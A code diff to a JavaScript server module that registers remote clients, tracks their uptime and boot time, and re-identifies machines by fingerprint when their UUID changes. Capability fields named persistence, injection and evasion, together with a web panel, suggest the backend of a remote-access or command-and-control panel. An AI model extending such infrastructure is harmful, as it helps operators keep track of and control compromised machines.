@@ -51,19 +51,29 @@ const clientIntegration = {
   registerClient: async (clientData) => {
     try {
       console.log('registerClient called with data:', clientData);
-      console.log('Capabilities received:', clientData.capabilities, 'Type:', typeof clientData.capabilities, 'IsArray:', Array.isArray(clientData.capabilities));
+      console.log('Machine fingerprint:', clientData.machineFingerprint);
       
-      // Check if client already exists
+      // Extract system info for fingerprinting and uptime
+      const systemInfo = clientData.systemInfo || {};
+      const uptimeSeconds = systemInfo.uptime || 0;
+      const bootTime = systemInfo.bootTime ? new Date(systemInfo.bootTime) : null;
+      
+      // Check for existing client by UUID first
       let client = await Client.findOne({ uuid: clientData.uuid });
       
       if (client) {
-        console.log('Updating existing client:', client.uuid);
+        console.log('Updating existing client by UUID:', client.uuid);
         // Update existing client
         client.computerName = clientData.computerName || client.computerName;
         client.ipAddress = clientData.ipAddress || client.ipAddress;
         client.hostname = clientData.hostname || client.hostname;
         client.platform = clientData.platform || client.platform;
         client.operatingSystem = detectOperatingSystem(clientData.platform, clientData.userAgent) || client.operatingSystem || 'unknown';
+        client.machineFingerprint = clientData.machineFingerprint || client.machineFingerprint;
+        client.uptimeSeconds = uptimeSeconds;
+        client.bootTime = bootTime || client.bootTime;
+        client.connectedAt = new Date();
+        
         // Properly update capabilities structure
         if (!client.capabilities) {
           client.capabilities = {
@@ -88,39 +98,86 @@ const clientIntegration = {
         await client.save();
         console.log('Existing client updated successfully');
         return client;
-      } else {
-        console.log('Creating new client with uuid:', clientData.uuid);
-        console.log('Creating new client with capabilities:', clientData.capabilities);
-        console.log('Capabilities is array?', Array.isArray(clientData.capabilities));
-        
-        // Create new client with default values for required fields
-        const newClient = new Client({
-          uuid: clientData.uuid,
-          computerName: clientData.computerName || 'Unknown Computer',
-          ipAddress: clientData.ipAddress || '0.0.0.0',
-          hostname: clientData.hostname,
-          platform: clientData.platform,
-          operatingSystem: detectOperatingSystem(clientData.platform, clientData.userAgent),
-          osVersion: 'Unknown',
-          architecture: detectArchitecture(clientData.platform, clientData.systemInfo),
-          capabilities: {
-            persistence: [],
-            injection: [],
-            evasion: [],
-            commands: [],
-            features: Array.isArray(clientData.capabilities) ? clientData.capabilities : []
-          },
-          additionalSystemDetails: clientData.additionalSystemDetails,
-          status: 'online',
-          lastActiveTime: new Date(),
-          lastHeartbeat: new Date()
-        });
-        
-        console.log('New client capabilities before save:', newClient.capabilities.features);
-        await newClient.save();
-        console.log('New client capabilities after save:', newClient.capabilities.features);
-        return newClient;
       }
+      
+      // Check for existing client by machine fingerprint
+      if (clientData.machineFingerprint) {
+        client = await Client.findOne({ machineFingerprint: clientData.machineFingerprint });
+        
+        if (client) {
+          console.log('Found existing client by machine fingerprint:', client.machineFingerprint);
+          console.log('Updating UUID from', client.uuid, 'to', clientData.uuid);
+          
+          // Update the existing client with new UUID and current data
+          client.uuid = clientData.uuid; // Update UUID
+          client.computerName = clientData.computerName || client.computerName;
+          client.ipAddress = clientData.ipAddress || client.ipAddress;
+          client.hostname = clientData.hostname || client.hostname;
+          client.platform = clientData.platform || client.platform;
+          client.operatingSystem = detectOperatingSystem(clientData.platform, clientData.userAgent) || client.operatingSystem || 'unknown';
+          client.uptimeSeconds = uptimeSeconds;
+          client.bootTime = bootTime || client.bootTime;
+          client.connectedAt = new Date();
+          
+          // Update capabilities
+          if (!client.capabilities) {
+            client.capabilities = {
+              persistence: [],
+              injection: [],
+              evasion: [],
+              commands: [],
+              features: []
+            };
+          }
+          if (clientData.capabilities && Array.isArray(clientData.capabilities)) {
+            client.capabilities.features = clientData.capabilities;
+          }
+          
+          client.additionalSystemDetails = clientData.additionalSystemDetails || client.additionalSystemDetails;
+          client.status = 'online';
+          client.lastActiveTime = new Date();
+          client.lastHeartbeat = new Date();
+          
+          await client.save();
+          console.log('Client updated with new UUID successfully');
+          return client;
+        }
+      }
+      
+      // Create new client
+      console.log('Creating new client with uuid:', clientData.uuid);
+      console.log('Creating new client with machine fingerprint:', clientData.machineFingerprint);
+      
+      const newClient = new Client({
+        uuid: clientData.uuid,
+        machineFingerprint: clientData.machineFingerprint,
+        computerName: clientData.computerName || 'Unknown Computer',
+        ipAddress: clientData.ipAddress || '0.0.0.0',
+        hostname: clientData.hostname,
+        platform: clientData.platform,
+        operatingSystem: detectOperatingSystem(clientData.platform, clientData.userAgent),
+        osVersion: 'Unknown',
+        architecture: detectArchitecture(clientData.platform, clientData.systemInfo),
+        uptimeSeconds: uptimeSeconds,
+        bootTime: bootTime,
+        connectedAt: new Date(),
+        capabilities: {
+          persistence: [],
+          injection: [],
+          evasion: [],
+          commands: [],
+          features: Array.isArray(clientData.capabilities) ? clientData.capabilities : []
+        },
+        additionalSystemDetails: clientData.additionalSystemDetails,
+        status: 'online',
+        lastActiveTime: new Date(),
+        lastHeartbeat: new Date()
+      });
+      
+      console.log('New client capabilities before save:', newClient.capabilities.features);
+      await newClient.save();
+      console.log('New client capabilities after save:', newClient.capabilities.features);
+      return newClient;
     } catch (error) {
       console.error('Error registering client:', error);
       throw error;
@@ -132,16 +189,21 @@ const clientIntegration = {
    * @param {String} uuid - Client UUID
    * @returns {Promise<Object>} Updated client object
    */
-  updateClientHeartbeat: async (uuid) => {
+  updateClientHeartbeat: async (uuid, systemInfo = {}) => {
     try {
       const now = new Date();
+      const uptimeSeconds = systemInfo.uptime || 0;
+      const bootTime = systemInfo.bootTime ? new Date(systemInfo.bootTime) : null;
+      
       const client = await Client.findOneAndUpdate(
         { uuid },
         { 
           $set: { 
             status: 'online',
             lastActiveTime: now,
-            lastHeartbeat: now
+            lastHeartbeat: now,
+            uptimeSeconds: uptimeSeconds,
+            ...(bootTime && { bootTime: bootTime })
           } 
         },
         { new: true }
@@ -178,9 +240,25 @@ const webPanelIntegration = {
    * @returns {Object} Formatted client data for web panel
    */
   formatClientForWebPanel: (client) => {
-    // Determine online status based on lastHeartbeat (within 5 minutes = online)
-    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
-    const isOnline = client.lastHeartbeat && new Date(client.lastHeartbeat) > fiveMinutesAgo;
+    // Determine online status based on lastHeartbeat (within 2 minutes = online)
+    const twoMinutesAgo = new Date(Date.now() - 2 * 60 * 1000);
+    const isOnline = client.status === 'online' && client.lastHeartbeat && new Date(client.lastHeartbeat) > twoMinutesAgo;
+    
+    // Format uptime display
+    let uptimeDisplay = '';
+    if (isOnline && client.uptimeSeconds) {
+      const days = Math.floor(client.uptimeSeconds / 86400);
+      const hours = Math.floor((client.uptimeSeconds % 86400) / 3600);
+      const minutes = Math.floor((client.uptimeSeconds % 3600) / 60);
+      
+      if (days > 0) {
+        uptimeDisplay = `${days}d ${hours}h ${minutes}m`;
+      } else if (hours > 0) {
+        uptimeDisplay = `${hours}h ${minutes}m`;
+      } else {
+        uptimeDisplay = `${minutes}m`;
+      }
+    }
     
     return {
       uuid: client.uuid,
@@ -191,6 +269,8 @@ const webPanelIntegration = {
       lastActiveTime: client.lastActiveTime ? 
         client.lastActiveTime.toISOString().split('T')[0] : 
         (client.lastSeen ? client.lastSeen.toISOString().split('T')[0] : 'Never'),
+      uptime: uptimeDisplay,
+      bootTime: client.bootTime ? client.bootTime.toISOString() : null,
       additionalSystemDetails: client.additionalSystemDetails || client.platform || 'Unknown',
       // Legacy fields for backward compatibility
       hostname: client.hostname,
@@ -240,7 +320,7 @@ const websocketHandlers = {
    */
   handleClientHeartbeat: async (data) => {
     try {
-      return await clientIntegration.updateClientHeartbeat(data.uuid);
+      return await clientIntegration.updateClientHeartbeat(data.uuid, data.systemInfo);
     } catch (error) {
       console.error('Error handling client heartbeat:', error);
       throw error;
